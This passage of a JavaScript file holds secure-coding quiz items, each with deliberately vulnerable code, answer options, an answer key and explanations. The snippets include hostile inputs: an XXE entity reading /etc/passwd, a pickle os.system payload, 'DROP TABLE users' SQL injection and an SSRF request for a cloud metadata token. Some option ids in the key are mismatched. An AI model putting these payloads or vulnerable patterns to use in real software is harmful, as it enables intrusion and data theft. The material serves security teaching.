        explanation: 'Protecting cloud credentials requires multiple layers. The attached IAM role should always have the minimum necessary permissions (B). Additionally, the infrastructure should be configured to use the latest, most secure version of the instance metadata service (A), which adds protection against SSRF attacks.',
    },
    {
        id: '148',
        title: 'PHP `==` Type Juggling',
        category: 'Broken Auth',
        difficulty: 'Advanced',
        xp: 75,
        description: 'PHP\'s loose comparison operator `==` performs type juggling, which can lead to unexpected security bypasses. For example, ` "0e123" == 0 ` evaluates to true.',
        vulnerableCode: `// PHP
$password = $_GET['password'];
// The real hash starts with '0e' but is not all numeric.
$real_hash = "0e123456789012345678901234567890";
// Attacker sends ?password=0
// PHP evaluates "0e..." as a float (zero) and compares it to the integer 0.
if ($password == $real_hash) {
    // Authentication bypass!
}`,
        language: 'php',
        options: [
            {
                id: '148a',
                code: `// Always use the strict comparison operator '===' when comparing values, especially for security checks.
if ($password === $real_hash) { ... }`
            },
            {
                id: '148b',
                code: `// Use a constant-time string comparison function for security-sensitive comparisons.
if (hash_equals($real_hash, $password)) { ... }`
            },
            {
                id: '148c',
                code: 'Both A and B are correct. A fixes the immediate type juggling bug. B is the best practice for comparing any secrets to prevent timing attacks.'
            }
        ],
        correctOptionId: '148c',
        explanation: 'PHP\'s type juggling is a notorious source of vulnerabilities. Using the strict `===` operator is essential (A). For security-critical comparisons like password hashes or tokens, a constant-time comparison function like `hash_equals` must be used to also prevent timing attacks (B).',
    },
    {
        id: '149',
        title: 'CORS Misconfiguration (Trusting `null` Origin)',
        category: 'CORS',
        difficulty: 'Advanced',
        xp: 70,
        description: 'A CORS policy allows the `null` origin, which can be triggered by local HTML files (`file://`), sandboxed iframes, and other scenarios, potentially allowing them to access protected resources.',
        vulnerableCode: `// JavaScript (Node.js/Express)
app.use((req, res, next) => {
    // This policy allows sandboxed documents to make requests.
    res.setHeader('Access-Control-Allow-Origin', 'null');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    next();
});`,
        language: 'javascript',
        options: [
            {
                id: '149a',
                code: `// Never whitelist the 'null' origin, especially in combination with 'Access-Control-Allow-Credentials: true'.
// Use a strict whitelist of trusted web origins.`
            },
            {
                id: '149b',
                code: `// Block requests that have an 'Origin: null' header.`
            },
            {
                id: '149c',
                code: 'Both A and B are correct ways to mitigate this risk. A is the configuration fix, while B is an explicit block.'
            }
        ],
        correctOptionId: '149c',
        explanation: 'The `null` origin is a special case that must be handled carefully. It should never be whitelisted in a CORS policy, particularly when credentials are also allowed. Your server should either explicitly block requests from the `null` origin or, preferably, rely on a strict whitelist that does not include it.',
    },
    {
        id: '150',
        title: 'Business Logic Flaw (Coupon Stacking)',
        category: 'Business Logic',
        difficulty: 'Expert',
        xp: 90,
        description: 'The application allows a user to apply multiple discount coupons to the same order, but the business logic does not prevent mutually exclusive coupons from being used together.',
        vulnerableCode: `// Conceptual API Logic
// User applies a "50% off" coupon.
// User then applies a "$20 off" coupon to the same order.
// The server does not check if coupons can be combined and applies both discounts.`,
        language: 'generic',
        options: [
            {
                id: '150a',
                code: `// The business logic must enforce rules about coupon compatibility.
// When a coupon is applied, check if it can be combined with coupons already in the cart.`
            },
            {
                id: '150b',
                code: `// Only allow one coupon per order.`
            },
            {
                id: '150c',
                code: 'Both are valid strategies. B is simpler but less flexible. A provides more complex but powerful business logic.'
            }
        ],
        correctOptionId: '150c',
        explanation: 'This is a business logic flaw that requires a server-side rule engine. The application must have clear rules defining which promotions can be combined. The simplest rule is to allow only one (B), but a more complex system would check for compatibility flags on each coupon before applying it (A).',
    },
    {
        id: '151',
        title: 'Business Logic Flaw (Gift Card Credit)',
        category: 'Business Logic',
        difficulty: 'Expert',
        xp: 95,
        description: 'A user can apply a gift card to an order multiple times by sending simultaneous requests before the gift card\'s balance is updated.',
        vulnerableCode: `// Conceptual API Logic
async function applyGiftCard(orderId, cardCode) {
  // 1. Fetch gift card balance.
  const card = await db.getCard(cardCode);
  if (card.balance > 0) {
    // 2. Attacker sends multiple requests that all pass this check.
    // 3. Apply credit to the order.
    await db.applyCredit(orderId, card.balance);
    // 4. Set gift card balance to zero.
    await db.setCardBalance(cardCode, 0);
  }
}`,
        language: 'generic',
        options: [
            {
                id: '151a',
                code: `// Use a database transaction with a row lock ('SELECT ... FOR UPDATE') on the gift card to make the read-and-update operation atomic.`
            },
            {
                id: '151b',
                code: `// Add a rate limit to the endpoint to slow down the attacker.`
            },
            {
                id: '151c',
                code: `// Delete the gift card record immediately instead of setting the balance to zero.`
            }
        ],
        correctOptionId: '151a',
        explanation: 'This is a race condition vulnerability. It must be solved by making the entire check-and-update process atomic. Using a database transaction that locks the specific gift card row ensures that only one request can process the card at a time, preventing its value from being used multiple times.',
    },
    {
        id: '152',
        title: 'JWT `jku` Header Injection',
        category: 'Auth',
        difficulty: 'Expert',
        xp: 90,
        description: 'A JWT library allows the use of the `jku` (JWK Set URL) header, which specifies a URL where the server should fetch the key to verify the token. An attacker can point this to a URL they control.',
        vulnerableCode: `// Conceptual: Attacker creates their own key pair.
// They craft a token and set the 'jku' header to 'https://evil.com/keys.json'.
// The vulnerable server fetches the attacker's public key from the 'jku' URL and uses it to validate the token.`,
        language: 'generic',
        options: [
            {
                id: '152a',
                code: `// The server must only use public keys from a trusted, hardcoded source. It should completely ignore the 'jku' and 'x5u' headers from the token.`
            },
            {
                id: '152b',
                code: `// Validate that the 'jku' header points to a whitelisted domain.`
            },
            {
                id: '152c',
                code: `// Ensure the 'jku' URL uses HTTPS.`
            }
        ],
        correctOptionId: '152a',
        explanation: 'The server must be the sole authority on which keys are trusted. It should never fetch cryptographic keys from a URL provided in an untrusted token. The JWT validation logic must be configured to ignore the `jku` header and use a key from its own trusted store.',
    },
    {
        id: '153',
        title: 'iOS WebView Universal Link Hijacking',
        category: 'Mobile Security',
        difficulty: 'Advanced',
        xp: 80,
        description: 'An iOS app\'s WebView navigates to a URL. If the URL is a Universal Link for another app, the OS may open that other app instead of keeping the user in the WebView.',
        vulnerableCode: `// Swift
let url = URL(string: "https://trusted-partner.com/some/path")!
// If 'trusted-partner.com' is also a Universal Link for a different app,
// iOS might open that app instead of loading the page in the WebView.
webView.load(URLRequest(url: url))`,
        language: 'generic',
        options: [
            {
                id: '153a',
                code: `// Check if the URL is a Universal Link and handle it appropriately before loading it in the WebView, or use a specific configuration to prevent the redirection.`
            },
            {
                id: '153b',
                code: `// This is expected OS behavior and not a vulnerability.`
            },
            {
                id: '153c',
                code: `// Before loading, check if the other app is installed.`
            }
        ],
        correctOptionId: '153a',
        explanation: 'Unexpected navigation away from the app can be jarring and is a security concern. The application should have logic to detect if a URL would trigger a Universal Link and decide whether to allow it or to load the content within the WebView, potentially by appending a query parameter that the destination site uses to suppress the deep link banner.',
    },
    {
        id: '154',
        title: 'Leaking Sensitive Data via `window.name`',
        category: 'Info Disclosure',
        difficulty: 'Advanced',
        xp: 70,
        description: 'An application stores sensitive data in the `window.name` property. If the user then navigates to an external site, that site can read the `window.name` property, leaking the data.',
        vulnerableCode: `// JavaScript
// Page A stores sensitive data
window.name = "SECRET_SESSION_DATA";

// User then clicks a link to an external site
// External site's JavaScript can read 'window.name'`,
        language: 'javascript',
        options: [
            {
                id: '154a',
                code: `// Do not store sensitive data in 'window.name'. Use 'sessionStorage' or other more appropriate storage mechanisms.`
            },
            {
                id: '154b',
                code: `// Clear 'window.name' before the user navigates away using an 'onbeforeunload' event listener.`
            },
            {
                id: '154c',
                code: `// Encrypt the data before placing it in 'window.name'.`
            }
        ],
        correctOptionId: '154a',
        explanation: 'The `window.name` property is unique in that it persists across navigations to different domains. It should never be used to store sensitive information. `sessionStorage` is a much better alternative for session-specific, non-persistent data.',
    },
    {
        id: '155',
        title: 'AWS S3 Ransomware via Versioning',
        category: 'Cloud Security',
        difficulty: 'Expert',
        xp: 90,
        description: 'An attacker with `s3:PutObject` and `s3:PutObjectVersionAcl` permissions on a versioned S3 bucket can "ransom" files by overwriting them with an encrypted version and denying the owner access to the new version.',
        vulnerableCode: `// AWS IAM Policy
{
    "Effect": "Allow",
    "Action": [
        "s3:PutObject",
        "s3:PutObjectVersionAcl" // Dangerous combination
    ],
    "Resource": "arn:aws:s3:::my-bucket/*"
}`,
        language: 'generic',
        options: [
            {
                id: '155a',
                code: `// Avoid granting 's3:PutObjectVersionAcl'. This permission is rarely needed and creates significant risk.`
            },
            {
                id: '155b',
                code: `// Enable Object Lock on the S3 bucket to prevent any modifications.`
            },
            {
                id: '155c',
                code: `// Regularly back up the S3 bucket to a different account.`
            }
        ],
        correctOptionId: '155a',
        explanation: 'This attack relies on the ability to change the permissions of a specific object version. By not granting the `s3:PutObjectVersionAcl` permission, you ensure that even if an object is overwritten, the original owner retains control of all versions and can simply delete the malicious version.',
    },
    {
        id: '156',
        title: 'Insecure `postMessage` targetOrigin',
        category: 'XSS',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'A web page sends a message to another window/iframe using `postMessage` with a wildcard (`*`) target origin, allowing a malicious site to intercept the message if it can control the receiving window.',
        vulnerableCode: `// JavaScript
// Sending a sensitive message to a child iframe
const childFrame = document.getElementById('my-frame');
const secret = 'user-auth-token';
// A wildcard origin allows any site to receive this message!
childFrame.contentWindow.postMessage(secret, '*');`,
        language: 'javascript',
        options: [
            {
                id: '156a',
                code: `// Always specify the exact, expected origin of the recipient window.
const childOrigin = 'https://trusted-frame.example.com';
childFrame.contentWindow.postMessage(secret, childOrigin);`
            },
            {
                id: '156b',
                code: `// Encrypt the message before sending it.`
            },
            {
                id: '156c',
                code: `// Check the recipient window's location before sending.`
            }
        ],
        correctOptionId: '156a',
        explanation: 'When sending a message with `postMessage`, you must specify the exact origin of the window you expect to receive it. Using a wildcard (`*`) is dangerous because it means your message could be sent to a malicious site if it manages to get into the iframe, potentially leaking sensitive information.',
    },
    {
        id: '157',
        title: 'Android `FileProvider` Path Traversal',
        category: 'Mobile Security',
        difficulty: 'Advanced',
        xp: 75,
        description: 'An Android `FileProvider` is configured to serve the root directory (`/`), allowing a malicious app with access to the provider to read any file on the app\'s private storage.',
        vulnerableCode: `<!-- AndroidManifest.xml -->
<provider
    android:name="androidx.core.content.FileProvider"
    android:authorities="com.example.fileprovider"
    android:exported="true">
    <meta-data
        android:name="android.support.FILE_PROVIDER_PATHS"
        android:resource="@xml/file_paths" />
</provider>

<!-- file_paths.xml -->
<paths>
    <root-path name="root" path="." /> <!-- VERY DANGEROUS -->
</paths>`,
        language: 'generic',
        options: [
            {
                id: '157a',
                code: `// Be highly specific about which directories you share. Share only a dedicated subdirectory, not the root.
// file_paths.xml
<paths>
    <files-path name="my_files" path="shared_files/" />
</paths>`
            },
            {
                id: '157b',
                code: `// Set 'android:exported="false"' on the provider.`
            },
            {
                id: '157c',
                code: `// Add a permission to the provider.`
            }
        ],
        correctOptionId: '157a',
        explanation: 'When using `FileProvider`, you must be as specific as possible about the paths you are exposing. Sharing the root path (`<root-path>`) is extremely dangerous as it exposes your entire app\'s sandbox. Instead, create a specific subdirectory for shared files and only expose that path (`<files-path>`).',
    },
    {
        id: '158',
        title: 'ReDoS via Inefficient Regex',
        category: 'DoS / Abuse',
        difficulty: 'Advanced',
        xp: 85,
        description: 'A regular expression uses multiple nested quantifiers, making it susceptible to Catastrophic Backtracking on certain inputs.',
        vulnerableCode: `// JavaScript
// This regex is vulnerable to ReDoS.
const regex = /^((a|b)+)+$/;
const longInput = "ababababababababababababX";
// This 'test' call will hang for an extremely long time.
regex.test(longInput);`,
        language: 'javascript',
        options: [
            {
                id: '158a',
                code: `// Rewrite the regex to avoid nested quantifiers.
const regex = /^[ab]+$/;`
            },
            {
                id: '158b',
                code: `// Limit the input string length before matching.`
            },
            {
                id: '158c',
                code: `// Use a different regex engine.`
            }
        ],
        correctOptionId: '158a',
        explanation: 'The root cause of this ReDoS vulnerability is the nested quantifier `(a|b)+)+`. The regex engine has to try an exponential number of ways to match the string. The fix is to rewrite the pattern to be unambiguous and avoid this backtracking. `^[ab]+$` achieves the same goal efficiently.',
    },
    {
        id: '159',
        title: 'Race Condition on Account Deletion',
        category: 'Business Logic',
        difficulty: 'Expert',
        xp: 90,
        description: 'A user can bypass a secondary confirmation step (like email verification) for account deletion by sending the final confirmation request directly and repeatedly.',
        vulnerableCode: `// Conceptual API Flow
// 1. POST /request-deletion -> sends email with token
// 2. POST /confirm-deletion?token=... -> deletes account

// Attacker repeatedly calls step 2 with a guessed or stolen token.
// The server has no state to know that deletion was not properly initiated.`,
        language: 'generic',
        options: [
            {
                id: '159a',
                code: `// Use a CAPTCHA on the confirmation step.`
            },
            {
                id: '159b',
                code: `// Create a stateful flow. The first request should set a status in the database (e.g., 'DELETION_PENDING'). The second request must check for this status before proceeding.`
            },
            {
                id: '159c',
                code: `// Require the user's password in the final confirmation request.`
            }
        ],
        correctOptionId: '159b',
        explanation: 'Critical multi-step operations must be stateful. The request for deletion should create a server-side state (like a flag on the user\'s account). The final confirmation step must then verify that the account is in the correct pending state before completing the action. This prevents the final step from being called out of order.',
    },
    {
        id: '160',
        title: 'Cloud Metadata SSRF (GCP)',
        category: 'Cloud Security',
        difficulty: 'Advanced',
        xp: 85,
        description: 'An application vulnerable to SSRF is running on Google Cloud, allowing an attacker to query the metadata service for access tokens.',
        vulnerableCode: `// Attacker finds an SSRF vulnerability and uses it to send a request to:
// http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
// This requires the 'Metadata-Flavor: Google' header.`,
        language: 'generic',
        options: [
            {
                id: '160a',
                code: `// Fix the root SSRF vulnerability by using a strict whitelist of allowed domains.`
            },
            {
                id: '160b',
                code: `// Configure firewall rules to block egress traffic from the VM to 169.254.169.254.`
            },
            {
                id: '160c',
                code: `// Use IAM roles with the principle of least privilege, so even if a token is stolen, its permissions are limited.`
            }
        ],
        correctOptionId: '160a',
        explanation: 'While B and C are excellent defense-in-depth measures, the primary vulnerability is the SSRF. It must be fixed by validating all user-supplied URLs against a strict whitelist, preventing the application from making requests to internal or unintended endpoints like the metadata service.',
    },
    {
        id: '161',
        title: 'Python Pickle RCE',
        category: 'Insecure Deserialization',
        difficulty: 'Expert',
        xp: 95,
        description: 'The `pickle` module in Python can be used to execute arbitrary code during deserialization, making it unsafe for untrusted data.',
        vulnerableCode: `// Python
import pickle, os
# Attacker creates a malicious pickle that executes a command when loaded.
class RCE:
    def __reduce__(self):
        return (os.system, ('ls',))
# The server receives this pickled object and loads it.
pickle.loads(malicious_data)`,
        language: 'python',
        options: [
            {
                id: '161a',
                code: `// Never use 'pickle' with data from untrusted sources. Use a safe, data-only format like JSON instead.
import json
data = json.loads(untrusted_data)`
            },
            {
                id: '161b',
                code: `// Use a different pickle protocol version.`
            },
            {
                id: '161c',
                code: `// Run the unpickling process in a sandboxed environment.`
            }
        ],
        correctOptionId: '161a',
        explanation: 'The `pickle` module is fundamentally insecure for untrusted data due to its ability to execute arbitrary code via the `__reduce__` method. There is no safe way to sanitize pickled data. The only correct solution is to use a secure serialization format like JSON.',
    },
    {
        id: '162',
        title: 'JWT Signature Stripping',
        category: 'Auth',
        difficulty: 'Advanced',
        xp: 75,
        description: 'An attacker takes a legitimately signed JWT, strips the signature part, and changes the algorithm in the header to "none". A vulnerable server might accept this as a valid, unsigned token.',
        vulnerableCode: `// Conceptual: Attacker takes a valid token, removes the signature,
// base64-decodes the header, changes 'alg' to 'none', re-encodes, and submits.
// A vulnerable library might see 'alg:none' and skip signature validation.`,
        language: 'generic',
        options: [
            {
                id: '162a',
                code: `// Your JWT validation logic must require a specific algorithm (e.g., 'HS256' or 'RS256') and should explicitly reject 'none'.`
            },
            {
                id: '162b',
                code: `// Always use the latest version of your JWT library, as most have patched this vulnerability.`
            },
            {
                id: '162c',
                code: `// Both A and B are crucial. The library should be updated, and your code should be explicit about the required algorithm.`
            }
        ],
        correctOptionId: '162c',
        explanation: 'This was a well-known vulnerability in many older JWT libraries. The fix requires both updating your libraries to a secure version (B) and defensively coding your validation logic to enforce a specific, strong algorithm, explicitly rejecting `none` (A).',
    },
    {
        id: '163',
        title: 'Session Puzzling',
        category: 'Session Management',
        difficulty: 'Advanced',
        xp: 85,
        description: 'An application uses the same session object to store state for both anonymous and authenticated users. An attacker can set certain session variables before login, which are then trusted after login, potentially bypassing security checks.',
        vulnerableCode: `// Conceptual Logic
// 1. Anonymous user visits '/set-preference?lang=en'
//    -> session['lang'] = 'en'
// 2. User then visits '/login' and authenticates.
// 3. The application does not regenerate the session.
// 4. An admin-only feature is accessible if 'session.lang' is a certain value, which the attacker set in step 1.`,
        language: 'generic',
        options: [
            {
                id: '163a',
                code: `// Always regenerate the session ID and clear all old session data immediately after a successful authentication.`
            },
            {
                id: '163b',
                code: `// Use different cookie names for anonymous and authenticated sessions.`
            },
            {
                id: '163c',
                code: `// Encrypt the session data.`
            }
        ],
        correctOptionId: '163a',
        explanation: 'To prevent session puzzling and fixation attacks, the session must be completely regenerated upon any change in privilege level, especially login. This involves creating a new session ID and starting with a clean, empty session data object, discarding any state from the pre-authentication session.',
    },
    {
        id: '164',
        title: 'Insecure Cross-domain `postMessage`',
        category: 'XSS',
        difficulty: 'Advanced',
        xp: 75,
        description: 'A listener for `postMessage` does not validate the origin of the sender, allowing a malicious website to send commands to the application.',
        vulnerableCode: `// JavaScript
window.addEventListener('message', function(event) {
  // Missing origin check!
  if (event.data.type === 'update-settings') {
    // Apply settings from any website.
  }
});`,
        language: 'javascript',
        options: [
            {
                id: '164a',
                code: `// Always validate the sender's origin against a whitelist of trusted domains.
window.addEventListener('message', function(event) {
  if (event.origin !== 'https://trusted.origin.com') {
    return;
  }
  // ... process message
});`
            },
            {
                id: '164b',
                code: `// Check that the data format is correct.`
            },
            {
                id: '164c',
                code: `// Use a different event name.`
            }
        ],
        correctOptionId: '164a',
        explanation: 'When using cross-domain messaging, it is absolutely critical that the receiving window validates the `event.origin` property to ensure the message is from an expected and trusted source. Without this check, any website can send messages to your page.',
    },
    {
        id: '165',
        title: 'SQL Injection via TRUNCATE',
        category: 'SQL Injection',
        difficulty: 'Expert',
        xp: 95,
        description: 'An application dynamically builds a table name for a TRUNCATE operation from user input. Since TRUNCATE cannot be parameterized, this can lead to injection.',
        vulnerableCode: `// PHP
// Attacker provides: "logs; DROP TABLE users"
$tableName = $_GET['table_to_truncate'];
$pdo->exec("TRUNCATE TABLE " . $tableName);`,
        language: 'php',
        options: [
            {
                id: '165a',
                code: `// Validate the user-provided table name against a strict whitelist of tables that are allowed to be truncated.
$allowedTables = ['logs', 'temp_data'];
if (in_array($tableName, $allowedTables)) {
    $pdo->exec("TRUNCATE TABLE " . $tableName);
}`
            },
            {
                id: '156b',
                code: `// Use prepared statements. (Note: This doesn't work for table names).`
            },
            {
                id: '165c',
                code: `// Escape the table name before using it in the query.`
            }
        ],
        correctOptionId: '165a',
        explanation: 'SQL injection is not limited to data manipulation. Any part of a query constructed from user input is a potential vector. Since table and column names cannot be parameterized, the only safe approach is to validate the user input against a hardcoded whitelist of allowed values.',
    },
    {
        id: '166',
        title: 'Regex Injection',
        category: 'RCE',
        difficulty: 'Advanced',
        xp: 80,
        description: 'User input is used to construct a regular expression without proper escaping, allowing an attacker to alter the regex logic.',
        vulnerableCode: `// JavaScript
// User provides a pattern like: ".*"
// The app wants to match the literal user input.
let userPattern = req.query.pattern;
let regex = new RegExp("^" + userPattern + "$");`,
        language: 'javascript',
        options: [
            {
                id: '166a',
                code: `// Escape all special regex characters from the user input before constructing the RegExp object.
function escapeRegex(string) {
    return string.replace(/[.*+?^\${}()|[\\]\\\\]/g, '\\\\$&');
}
let regex = new RegExp("^" + escapeRegex(userPattern) + "$");`
            },
            {
                id: '166b',
                code: `// Limit the length of the user's pattern.`
            },
            {
                id: '166c',
                code: `// Use a different regex engine.`
            }
        ],
        correctOptionId: '166a',
        explanation: 'If you need to match a user\'s literal input string as part of a larger regular expression, you must escape any characters that have special meaning within a regex. This ensures their input is treated as a literal sequence of characters.',
    },
    {
        id: '167',
        title: 'Android WebView URL Loading',
        category: 'Mobile Security',
        difficulty: 'Advanced',
        xp: 80,
        description: 'An app loads a user-provided URL in a WebView without validation, allowing a malicious app to use an Intent to force the WebView to load a `file://` URL and read local files.',
        vulnerableCode: `// Java (Android)
// A malicious app can send an Intent with data: "file:///data/data/com.myapp/files/secret.txt"
Uri data = getIntent().getData();
if (data != null) {
    webView.loadUrl(data.toString());
}`,
        language: 'java',
        options: [
            {
                id: '167a',
                code: `// Never load file:// URLs from untrusted sources. Validate the scheme of the URL and only allow http or https.
if ("https".equals(data.getScheme()) || "http".equals(data.getScheme())) {
    webView.loadUrl(data.toString());
}`
            },
            {
                id: '167b',
                code: `// Disable file access in the WebView settings.
webSettings.setAllowFileAccess(false);`
            },
            {
                id: '167c',
                code: 'Both A and B are necessary defenses. A validates the incoming URL, while B hardens the WebView itself.'
            }
        ],
        correctOptionId: '167c',
        explanation: 'This is a critical vulnerability. Your application must always validate incoming URLs to ensure they use an expected protocol like HTTP/S (A). Additionally, you should apply the principle of least privilege and disable local file access in WebViews that are intended to load remote content (B).',
    },
    {
        id: '168',
        title: 'Cloud Storage Signed URL Generation',
        category: 'Cloud Security',
        difficulty: 'Expert',
        xp: 90,
        description: 'An application generates a signed URL for a cloud storage object, but the user can control the object key, allowing them to generate a signed URL for any object.',
        vulnerableCode: `// Python (GCP)
// User controls 'object_name' via a request parameter.
// Attacker asks for '../../etc/shadow' or another user's file.
blob = bucket.blob(object_name)
url = blob.generate_signed_url(version="v4", expiration=...)`,
        language: 'python',
        options: [
            {
                id: '168a',
                code: `// Do not let the user specify the object key directly. Use an internal identifier and map it to the actual, full object key on the server-side after performing an authorization check.`
            },
            {
                id: '168b',
                code: `// Sanitize the 'object_name' to remove ".." and "/" characters.`
            },
            {
                id: '168c',
                code: `// Set a very short expiration time on the signed URL.`
            }
        ],
        correctOptionId: '168a',
        explanation: 'This is a form of Insecure Direct Object Reference (IDOR). The client should never directly specify the resource to be accessed. The server should use an abstract identifier provided by the client, perform an authorization check, and then map that identifier to the full, canonical object path.',
    },
    {
        id: '169',
        title: 'XXE via `DOCTYPE`',
        category: 'XXE',
        difficulty: 'Advanced',
        xp: 85,
        description: 'An XML parser is not configured to disable DTDs, allowing an attacker to exfiltrate local files using an external entity.',
        vulnerableCode: `// Java
// Attacker XML: <!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(request.getInputStream());`,
        language: 'java',
        options: [
            {
                id: '169a',
                code: `// Explicitly disable Document Type Definitions (DTDs) to prevent all entity-related attacks.
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);`
            },
            {
                id: '169b',
                code: `// Sanitize the input XML to remove the string "<!DOCTYPE".`
            },
            {
                id: '169c',
                code: `// Run the parser in a container with no file system access.`
            }
        ],
        correctOptionId: '169a',
        explanation: 'XXE vulnerabilities are caused by features in XML parsers that are enabled by default. The most secure and direct way to mitigate this entire class of vulnerability is to disable DTD processing in the parser configuration.',
    },
    {
        id: '170',
        title: 'SSRF via DNS Rebinding',
        category: 'SSRF',
        difficulty: 'Expert',
        xp: 100,
        description: 'An application checks a user-provided URL against a blocklist, but an attacker uses a domain with a very short DNS TTL. The server resolves it to a safe IP, but by the time the request is made, the DNS has changed to a forbidden internal IP.',
        vulnerableCode: `// Conceptual Logic
// 1. App receives URL: http://attacker.com
// 2. App resolves attacker.com to a safe IP (e.g., 8.8.8.8) and validates it.
// 3. DNS TTL for attacker.com is 1 second. Attacker updates DNS to point to 127.0.0.1.
// 4. App makes the HTTP request. The OS re-resolves the DNS to the internal IP, 127.0.0.1.`,
        language: 'generic',
        options: [
            {
                id: '170a',
                code: `// This is a complex attack. One mitigation is to resolve the IP address once, perform the validation, and then make the subsequent HTTP request directly to the validated IP address, passing the original hostname in the 'Host' header.`
            },
            {
                id: '170b',
                code: `// Block all domains with a low DNS TTL.`
            },
            {
                id: '170c',
                code: `// Use a different DNS resolver.`
            }
        ],
        correctOptionId: '170a',
        explanation: 'DNS rebinding attacks exploit the time gap between a security check and the actual use of a resource. To fix this, the application must ensure that the IP address it validated is the same one it connects to. This involves making the HTTP request directly to the IP and manually setting the `Host` header.',
    },
    {
        id: '171',
        title: 'Business Logic Flaw: Ticket Reservation',
        category: 'Business Logic',
        difficulty: 'Advanced',
        xp: 85,
        description: 'A ticketing system allows a user to add a limited-stock item to their cart, but doesn\'t reserve it. Another user can buy the item while it is in the first user\'s cart, leading to an oversold event.',
        vulnerableCode: `// Conceptual API Flow
// 1. User A adds the last ticket to their cart.
// 2. User B adds the same last ticket to their cart.
// 3. User B completes checkout. The ticket stock becomes 0.
// 4. User A tries to checkout and gets an "out of stock" error.`,
        language: 'generic',
        options: [
            {
                id: '172a',
                code: `// Implement a reservation system. When an item is added to a cart, create a temporary reservation with a short expiration (e.g., 10 minutes). The checkout process must confirm the reservation is still valid.`
            },
            {
                id: '172b',
                code: `// Use a 'first come, first served' model at checkout and show an error if the item is gone.`
            },
            {
                id: '172c',
                code: `// Allow overselling and handle it manually later.`
            }
        ],
        correctOptionId: '172a',
        explanation: 'While B is a valid (though poor UX) model, a better business logic solution for limited-stock items is to implement a reservation system. This provides a better user experience by temporarily guaranteeing the item\'s availability for a short period.',
    },
    {
        id: '173',
        title: 'Reflected File Download (RFD)',
        category: 'Info Disclosure',
        difficulty: 'Advanced',
        xp: 80,
        description: 'An API endpoint reflects user-controlled input in its response with a `Content-Disposition: attachment` header. An attacker can craft a URL that causes the browser to download a file with a malicious name and content.',
        vulnerableCode: `// Python (Flask)
// Attacker crafts URL: /api/export.bat?data=echo+pwned
@app.route('/api/export.bat')
def export():
    data = request.args.get('data')
    return Response(data, headers={'Content-Disposition': 'attachment; filename=export.bat'})`,
        language: 'python',
        options: [
            {
                id: '173a',
                code: `// Do not allow user input to control the filename in the Content-Disposition header.`
            },
            {
                id: '173b',
                code: `// Do not reflect user input directly in the response body of a file download.`
            },
            {
                id: '173c',
                code: 'Both A and B are necessary. The server should control the filename, and the response body should be generated from safe, server-side data, not user input.'
            }
        ],
        correctOptionId: '173c',
        explanation: 'RFD attacks rely on the browser trusting the server\'s `Content-Disposition` header. To prevent this, the server must never allow user input to dictate the filename of a download (A) and must not reflect user input into the content of a downloadable file (B).',
    },
    {
        id: '174',
        title: 'Leaking Private IP Addresses via WebRTC',
        category: 'Info Disclosure',
        difficulty: 'Advanced',
        xp: 70,
        description: 'WebRTC connections can leak a user\'s true internal IP address, even if they are behind a VPN, through STUN requests.',
        vulnerableCode: `// JavaScript (Client-side)
// Simply creating a PeerConnection object can trigger STUN requests
// that reveal the user's local IP address.
const pc = new RTCPeerConnection();`,
        language: 'javascript',
        options: [
            {
                id: '174a',
                code: `// There is no perfect client-side code fix. This is a browser feature.
// Users must configure their browser (e.g., via extensions like uBlock Origin) to prevent this leakage if they are concerned.`
            },
            {
                id: '174b',
                code: `// Only create a PeerConnection after getting user consent.`
            },
            {
                id: '174c',
                code: `// Avoid using WebRTC.`
            }
        ],
        correctOptionId: '174a',
        explanation: 'This is a well-known privacy issue with WebRTC. While applications should be mindful of when they initiate WebRTC connections, the leakage itself is a function of the browser and network configuration. The primary mitigation lies with the user configuring their browser or using a VPN that specifically protects against WebRTC leaks.',
    },
    {
        id: '175',
        title: 'AWS IAM Role Trust Policy Too Permissive',
        category: 'Cloud Security',
        difficulty: 'Advanced',
        xp: 85,
        description: 'An IAM role\'s trust policy allows any user or service within the entire AWS account to assume it, violating the principle of least privilege.',
        vulnerableCode: `// IAM Role Trust Policy (JSON)
{
  "Effect": "Allow",
  "Principal": {
    "AWS": "arn:aws:iam::111122223333:root" // Allows anyone in the account
  },
  "Action": "sts:AssumeRole"
}`,
        language: 'generic',
        options: [
            {
                id: '175a',
                code: `// Be highly specific. The Principal should be the exact user, service (e.g., EC2), or specific role ARN that needs to assume this role.
// e.g., "Principal": { "Service": "ec2.amazonaws.com" }`
            },
            {
                id: '175b',
                code: `// Add a condition to the policy, such as checking the source IP.`
            },
            {
                id: '175c',
                code: `// Limit the permissions of the role itself.`
            }
        ],
        correctOptionId: '175a',
        explanation: 'A role\'s trust policy is a critical security boundary. The `Principal` should always be scoped down to the smallest possible set of entities that legitimately need to assume the role. Allowing the entire account (`root`) is almost always incorrect.',
    },
    {
        id: '176',
        title: 'PHP Object Injection',
        category: 'Insecure Deserialization',
        difficulty: 'Expert',
        xp: 95,
        description: 'When `unserialize()` is used on user-provided data, an attacker can supply a serialized string that instantiates an arbitrary object, potentially leading to the invocation of magic methods like `__wakeup()` or `__destruct()` and causing RCE.',
        vulnerableCode: `// PHP
class MyFile {
    public $filename;
    function __destruct() {
        // If an attacker can control the filename, they might delete files.
        unlink($this->filename);
    }
}
// Attacker provides a serialized MyFile object via a cookie.
unserialize($_COOKIE['user_data']);`,
        language: 'php',
        options: [
            {
                id: '176a',
                code: `// Do not use unserialize() on any untrusted data.
// Use json_decode() for data interchange instead.`
            },
            {
                id: '176b',
                code: `// In PHP 7+, you can provide an 'allowed_classes' option to unserialize().
unserialize($data, ['allowed_classes' => ['ExpectedClass']]);`
            },
            {
                id: '176c',
                code: 'Both A and B are valid mitigations. A is the most broadly recommended best practice, while B provides a specific defense if native serialization must be used.'
            }
        ],
        correctOptionId: '176c',
        explanation: 'PHP Object Injection is a severe vulnerability. The ideal solution is to completely avoid deserializing untrusted data (A). If that is not possible, newer PHP versions allow you to provide a whitelist of classes that are permitted to be deserialized, which significantly reduces the attack surface (B).',
    },
    {
        id: '177',
        title: 'Android `Tapjacking`',
        category: 'Mobile Security',
        difficulty: 'Advanced',
        xp: 75,
